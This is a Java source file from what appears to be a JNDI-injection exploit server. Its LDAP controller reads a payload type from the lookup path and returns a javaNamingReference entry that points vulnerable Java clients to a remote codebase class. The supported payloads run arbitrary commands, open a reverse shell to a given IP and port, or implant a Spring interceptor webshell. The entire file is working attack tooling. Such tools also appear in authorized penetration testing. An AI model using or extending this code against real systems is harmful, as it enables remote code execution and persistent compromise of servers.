package com.idiot9.ldap.controllers;

import com.idiot9.ldap.enumtypes.PayloadType;
import com.idiot9.ldap.exceptions.IncorrectParamsException;
import com.idiot9.ldap.exceptions.UnSupportedPayloadTypeException;
import com.idiot9.ldap.templates.CommandTemplates;
import com.idiot9.ldap.templates.SpringEchoTemplates;
import com.idiot9.ldap.templates.SpringInterceptorTemplates;
import com.idiot9.ldap.utils.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.URL;

@LdapMapping(uri = { "/basic" })
public class BasicController implements LdapController {
    //最后的反斜杠不能少
    private String codebase = Config.codebase;
    private PayloadType type;
    private String[] params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base + " with basic remote reference payload");
        //这个方法里面有改动，其他基本无改动
        Entry e = new Entry(base);
        String className = "";

        switch (type){
            case command:
                CommandTemplates commandTemplate = new CommandTemplates(params[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                break;
            case springinterceptorshell:
                SpringInterceptorTemplates springInterceptorTemplates = new SpringInterceptorTemplates(params[0]);
                springInterceptorTemplates.cache();
                className = springInterceptorTemplates.getClassName();
                break;
            case springecho:
                SpringEchoTemplates springEchoTemplates = new SpringEchoTemplates(params[0]);
                springEchoTemplates.cache();
                className = springEchoTemplates.getClassName();
                break;
        }

        URL turl = new URL(new URL(this.codebase), className + ".class");
        System.out.println("[+] Send LDAP reference result for " + base + " redirecting to " + turl);
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaCodeBase", this.codebase);
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        e.addAttribute("javaFactory", className);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int fistIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            try{
                type = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println("[+] Paylaod: " + type);
            }catch(IllegalArgumentException e){
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(fistIndex + 1, secondIndex));
            }

            switch(type){
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println("[+] URL: " + url);
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println("[+] Command: " + cmd);
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println("[+] IP: " + results[0]);
                    System.out.println("[+] Port: " + results[1]);
                    params = results;
                    break;
                case springinterceptorshell:
                    String key = base.substring(secondIndex + 1);
                    params = new String[]{key};
                case springecho:
                    key = base.substring(secondIndex + 1);
                    params = new String[]{key};
            }
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}
